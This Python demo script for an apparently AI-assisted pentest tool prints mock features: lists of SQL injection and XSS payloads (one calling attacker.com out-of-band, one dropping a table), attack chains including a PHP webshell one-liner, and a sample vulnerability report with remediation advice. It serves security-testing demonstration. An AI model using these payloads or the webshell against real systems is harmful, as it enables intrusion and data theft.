#!/usr/bin/env python3
"""
AI Features Demo Script
Demonstrates all AI capabilities without needing a full scan
"""

import asyncio
import json
from datetime import datetime
from pathlib import Path

# This script demonstrates the AI features in isolation
# Run this to see how each AI component works

print("🤖 All-Hack AI Features Demo")
print("=" * 60)
print()

# ====================
# Demo 1: Memory System
# ====================
print("📋 DEMO 1: Memory System 🧠")
print("-" * 60)

class MockMemorySystem:
    """Simulates the AI memory system"""

    def __init__(self):
        self.sessions = []
        self.patterns = {
            "sql_injection": {
                "successful_payloads": [
                    "admin' OR '1'='1'--",
                    "admin' UNION SELECT NULL--",
                    "admin'; WAITFOR DELAY '00:00:05'--"
                ],
                "success_rate": 0.75,
                "common_filters": ["'", '"', "--"]
            },
            "xss": {
                "successful_payloads": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>"
                ],
                "success_rate": 0.60,
                "common_filters": ["script", "onerror"]
            }
        }
        self.similar_targets = [
            {
                "url": "https://example.com",
                "scan_date": "2025-11-25",
                "vulnerabilities_found": 12,
                "success_rate": 0.80
            },
            {
                "url": "https://api.example.com",
                "scan_date": "2025-11-20",
                "vulnerabilities_found": 8,
                "success_rate": 0.65
            }
        ]

    def start_session(self, target):
        print(f"🧠 Starting memory session for: {target}")
        session = {
            "id": f"session_{len(self.sessions)+1}",
            "target": target,
            "start_time": datetime.now().isoformat()
        }
        self.sessions.append(session)
        print(f"   Session ID: {session['id']}")
        return session

    def get_similar_targets(self, target):
        print(f"\n🔍 Searching for similar targets to: {target}")
        # Simulate finding similar targets
        found = [t for t in self.similar_targets if "example.com" in target]
        print(f"   Found: {len(found)} similar targets")
        for t in found:
            print(f"   - {t['url']} (Success rate: {t['success_rate']:.0%})")
        return found

    def get_learned_patterns(self, vuln_type):
        print(f"\n📚 Retrieving learned patterns for: {vuln_type}")
        pattern = self.patterns.get(vuln_type, {})
        if pattern:
            print(f"   Success rate: {pattern['success_rate']:.0%}")
            print(f"   Known payloads: {len(pattern['successful_payloads'])}")
            print(f"   Common filters: {', '.join(pattern['common_filters'])}")
        return pattern

# Demo memory system
memory = MockMemorySystem()
session = memory.start_session("https://example.com/api")
memory.get_similar_targets("https://example.com/api")
memory.get_learned_patterns("sql_injection")

print("\n✅ Memory System Demo Complete!")
print()

# ====================
# Demo 2: Payload Generator
# ====================
print("📋 DEMO 2: AI Payload Generator 🎯")
print("-" * 60)

class MockPayloadGenerator:
    """Simulates AI-powered payload generation"""

    def generate_sql_payloads(self, context):
        print(f"🎯 Generating SQL injection payloads")
        print(f"   Database: {context['database']}")
        print(f"   Constraints: {context['constraints']}")
        print(f"   Memory patterns: {len(context['memory_patterns'])} successful patterns")

        print(f"\n💡 AI-Generated Payloads:")
        payloads = [
            ("Basic OR bypass", "admin' OR '1'='1'--"),
            ("UNION-based extraction", "admin' UNION SELECT NULL,NULL,NULL--"),
            ("Time-based blind (MySQL)", "admin' AND SLEEP(5)--"),
            ("Time-based blind (MSSQL)", "admin'; WAITFOR DELAY '00:00:05'--"),
            ("Boolean-based blind", "admin' AND '1'='1"),
            ("Stacked queries", "admin'; DROP TABLE users--"),
            ("WAF evasion (encoding)", "admin%27%20OR%20%271%27=%271"),
            ("WAF evasion (comment)", "admin'/**/OR/**/1=1--"),
            ("Error-based", "admin' AND 1=CONVERT(int,@@version)--"),
            ("Out-of-band", "admin'; EXEC master..xp_dirtree '\\\\attacker.com\\a'--")
        ]

        for i, (description, payload) in enumerate(payloads, 1):
            print(f"   {i:2d}. {description:30s} → {payload}")

        return [p[1] for p in payloads]

    def generate_xss_payloads(self, context):
        print(f"\n🎯 Generating XSS payloads")
        print(f"   Context: {context['context']}")
        print(f"   Filters: {', '.join(context['filters'])}")

        print(f"\n💡 AI-Generated Payloads:")
        payloads = [
            ("Basic script tag", "<script>alert(1)</script>"),
            ("IMG tag with onerror", "<img src=x onerror=alert(1)>"),
            ("SVG with onload", "<svg/onload=alert(1)>"),
            ("Uppercase bypass", "<SCRIPT>alert(1)</SCRIPT>"),
            ("Double encoding", "%253Cscript%253Ealert(1)%253C/script%253E"),
            ("Filter bypass (no script)", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"),
            ("Event handler", "<body onload=alert(1)>"),
            ("Iframe injection", "<iframe src=javascript:alert(1)>"),
            ("Data protocol", "<a href=\"data:text/html,<script>alert(1)</script>\">Click</a>"),
            ("Polyglot", "javascript:/*--></title></style></textarea></script></xmp>*/alert(1)")
        ]

        for i, (description, payload) in enumerate(payloads, 1):
            print(f"   {i:2d}. {description:30s} → {payload}")

        return [p[1] for p in payloads]

# Demo payload generator
generator = MockPayloadGenerator()
generator.generate_sql_payloads({
    "database": "MySQL",
    "constraints": {"max_length": 100, "filtered_chars": []},
    "memory_patterns": ["OR 1=1", "UNION SELECT", "SLEEP()"]
})

generator.generate_xss_payloads({
    "context": "HTML attribute",
    "filters": ["<script", "onerror"]
})

print("\n✅ Payload Generator Demo Complete!")
print()

# ====================
# Demo 3: Exploitation Chains
# ====================
print("📋 DEMO 3: Exploitation Chain Builder 🔗")
print("-" * 60)

class MockChainBuilder:
    """Simulates exploitation chain discovery"""

    def find_chains(self, vulnerabilities):
        print(f"🔗 Analyzing {len(vulnerabilities)} vulnerabilities for chains...")

        chains = [
            {
                "name": "XSS → CSRF → Account Takeover",
                "severity": "critical",
                "probability": 0.85,
                "steps": [
                    {
                        "step": 1,
                        "vuln": "XSS in /profile",
                        "cwe": "CWE-79",
                        "action": "Inject JavaScript to steal CSRF token"
                    },
                    {
                        "step": 2,
                        "vuln": "CSRF on /change-email",
                        "cwe": "CWE-352",
                        "action": "Use stolen token to change victim's email"
                    },
                    {
                        "step": 3,
                        "vuln": "Password reset flow",
                        "cwe": "CWE-640",
                        "action": "Request password reset to new email"
                    },
                    {
                        "step": 4,
                        "vuln": "Account takeover",
                        "cwe": "CWE-287",
                        "action": "Login as victim using new password"
                    }
                ],
                "impact": "Full account takeover with complete access to user data"
            },
            {
                "name": "SQL Injection → File Write → RCE",
                "severity": "critical",
                "probability": 0.70,
                "steps": [
                    {
                        "step": 1,
                        "vuln": "SQL Injection in /search",
                        "cwe": "CWE-89",
                        "action": "Exploit SQLi to write webshell to disk"
                    },
                    {
                        "step": 2,
                        "vuln": "File upload directory writable",
                        "cwe": "CWE-732",
                        "action": "Write PHP shell: <?php system($_GET['cmd']); ?>"
                    },
                    {
                        "step": 3,
                        "vuln": "Direct file access",
                        "cwe": "CWE-434",
                        "action": "Access shell at /uploads/shell.php?cmd=whoami"
                    },
                    {
                        "step": 4,
                        "vuln": "Remote code execution",
                        "cwe": "CWE-94",
                        "action": "Execute arbitrary system commands"
                    }
                ],
                "impact": "Complete server compromise and data exfiltration"
            },
            {
                "name": "JWT Forgery → Admin Access → SQL Injection",
                "severity": "critical",
                "probability": 0.90,
                "steps": [
                    {
                        "step": 1,
                        "vuln": "JWT weak secret",
                        "cwe": "CWE-798",
                        "action": "Crack JWT secret: 'secret123'"
                    },
                    {
                        "step": 2,
                        "vuln": "JWT forgery",
                        "cwe": "CWE-347",
                        "action": "Forge token with admin role"
                    },
                    {
                        "step": 3,
                        "vuln": "Admin-only SQL endpoint",
                        "cwe": "CWE-89",
                        "action": "Access /admin/search with SQLi vulnerability"
                    },
                    {
                        "step": 4,
                        "vuln": "Database dump",
                        "cwe": "CWE-200",
                        "action": "Extract all user credentials and PII"
                    }
                ],
                "impact": "Full database access and credential theft"
            }
        ]

        print(f"\n✅ Found {len(chains)} exploitation chains:\n")

        for i, chain in enumerate(chains, 1):
            print(f"{i}. {chain['name']}")
            print(f"   Severity: {chain['severity'].upper()}")
            print(f"   Probability: {chain['probability']:.0%}")
            print(f"   Steps: {len(chain['steps'])}")
            print(f"\n   Attack Path:")
            for step in chain['steps']:
                print(f"     Step {step['step']}: {step['vuln']}")
                print(f"             ↓ {step['action']}")
            print(f"\n   Impact: {chain['impact']}")
            print()

        return chains

# Demo chain builder
builder = MockChainBuilder()
mock_vulns = [
    {"type": "xss", "url": "/profile"},
    {"type": "csrf", "url": "/change-email"},
    {"type": "sql_injection", "url": "/search"},
    {"type": "jwt_weak_secret", "url": "/api/login"}
]
builder.find_chains(mock_vulns)

print("✅ Exploitation Chain Demo Complete!")
print()

# ====================
# Demo 4: Report Generator
# ====================
print("📋 DEMO 4: AI Report Generator 📄")
print("-" * 60)

class MockReportGenerator:
    """Simulates AI-powered report generation"""

    def generate_executive_summary(self, scan_data):
        print("📄 Generating Executive Summary (for Management)...\n")

        report = f"""
{'='*60}
SECURITY ASSESSMENT - EXECUTIVE SUMMARY
{'='*60}

Target: {scan_data['target']}
Date: {scan_data['date']}
Assessed by: AI-Powered Pentest Tool

OVERALL RISK SCORE: {scan_data['risk_score']}/10 (CRITICAL)

{'='*60}
KEY FINDINGS
{'='*60}

• {scan_data['critical_count']} CRITICAL vulnerabilities requiring IMMEDIATE action
• {scan_data['high_count']} HIGH-severity issues affecting user data security
• {scan_data['medium_count']} MEDIUM-severity issues requiring attention
• Estimated remediation time: {scan_data['remediation_days']} days

{'='*60}
BUSINESS IMPACT
{'='*60}

1. Data Breach Risk
   - Potential exposure: {scan_data['users_at_risk']:,} user accounts
   - Sensitive data: Credentials, PII, payment information
   - Financial impact: ${scan_data['financial_impact_min']:,} - ${scan_data['financial_impact_max']:,}

2. Compliance Violations
   - GDPR: Article 32 (Security of processing)
   - PCI-DSS: Requirement 6.5 (Application vulnerabilities)
   - HIPAA: Administrative Safeguards (if applicable)

3. Reputational Damage
   - Customer trust erosion
   - Potential media coverage
   - Brand value impact

{'='*60}
RECOMMENDED ACTIONS
{'='*60}

IMMEDIATE (Days 1-7):
  ✓ Patch SQL injection in login endpoint
  ✓ Fix authentication bypass vulnerability
  ✓ Disable exposed admin panel

SHORT-TERM (Days 8-21):
  ✓ Fix all XSS vulnerabilities
  ✓ Implement CSRF protection
  ✓ Update JWT implementation

MEDIUM-TERM (Days 22-30):
  ✓ Review access control mechanisms
  ✓ Implement security headers
  ✓ Set up WAF rules

{'='*60}
CONCLUSION
{'='*60}

This assessment identified several critical security vulnerabilities
that pose significant risk to the organization. Immediate action is
required to prevent potential data breaches and ensure compliance
with industry regulations.

We recommend prioritizing the critical and high-severity findings
outlined in the detailed technical report.

{'='*60}
        """

        print(report)
        return report

    def generate_technical_summary(self, vuln):
        print("\n📄 Sample Technical Report Section...\n")

        report = f"""
{'='*60}
[CRITICAL] {vuln['name']}
{'='*60}

CLASSIFICATION:
  CWE:         {vuln['cwe']}
  OWASP:       {vuln['owasp']}
  CVSS Score:  {vuln['cvss']} (Critical)
  Severity:    CRITICAL

AFFECTED ENDPOINT:
  URL:         {vuln['url']}
  Method:      {vuln['method']}
  Parameter:   {vuln['parameter']}

PROOF OF CONCEPT:
{vuln['poc']}

VALIDATION STATUS:
  Status:      ✅ CONFIRMED
  Method:      Automated PoC exploitation
  Evidence:    {vuln['evidence']}
  Confidence:  100%

EXPLOITATION:
  Difficulty:  {vuln['difficulty']}
  Prerequisites: {vuln['prerequisites']}
  Impact:      {vuln['impact']}

REMEDIATION:
{vuln['remediation']}

REFERENCES:
  • {vuln['ref1']}
  • {vuln['ref2']}
  • {vuln['ref3']}

{'='*60}
        """

        print(report)
        return report

# Demo report generator
generator = MockReportGenerator()

scan_data = {
    "target": "https://example.com",
    "date": "2025-11-28",
    "risk_score": 8.5,
    "critical_count": 3,
    "high_count": 12,
    "medium_count": 25,
    "remediation_days": "30-45",
    "users_at_risk": 50000,
    "financial_impact_min": 500000,
    "financial_impact_max": 2000000
}

generator.generate_executive_summary(scan_data)

vuln_sample = {
    "name": "SQL Injection in User Authentication",
    "cwe": "CWE-89: SQL Injection",
    "owasp": "A03:2021 - Injection",
    "cvss": "9.8",
    "url": "https://example.com/api/login",
    "method": "POST",
    "parameter": "username",
    "poc": '''POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "username": "admin' OR '1'='1'--",
  "password": "anything"
}

Response: 200 OK
{ "token": "eyJ...", "role": "admin" }''',
    "evidence": "Successfully authenticated as 'admin' user without valid password",
    "difficulty": "Low (no authentication required)",
    "prerequisites": "None",
    "impact": "Complete authentication bypass, access to all user accounts",
    "remediation": '''1. Use parameterized queries:

   # BEFORE (Vulnerable)
   query = f"SELECT * FROM users WHERE username='{username}'"

   # AFTER (Secure)
   query = "SELECT * FROM users WHERE username=?"
   cursor.execute(query, (username,))

2. Implement input validation:

   import re
   def validate_username(username):
       if not re.match(r'^[a-zA-Z0-9_]{{3,20}}$', username):
           raise ValueError("Invalid username")
       return username

3. Add rate limiting and monitoring''',
    "ref1": "https://owasp.org/www-community/attacks/SQL_Injection",
    "ref2": "https://cwe.mitre.org/data/definitions/89.html",
    "ref3": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
}

generator.generate_technical_summary(vuln_sample)

print("\n✅ Report Generator Demo Complete!")
print()

# ====================
# Summary
# ====================
print("=" * 60)
print("🎉 AI FEATURES DEMO COMPLETE!")
print("=" * 60)
print()
print("All AI components demonstrated:")
print("  ✅ Memory System - Learns from every scan")
print("  ✅ Payload Generator - Creates intelligent payloads")
print("  ✅ Exploitation Chains - Finds multi-step attacks")
print("  ✅ Report Generator - Creates professional reports")
print()
print("These features are ALL ACTIVE when you run All-Hack with:")
print("  • ENABLE_AI_AGENT=true in .env")
print("  • Ollama running with llama3.2 model")
print()
print("For full testing guide, see: AI_TESTING_GUIDE.md")
print("=" * 60)
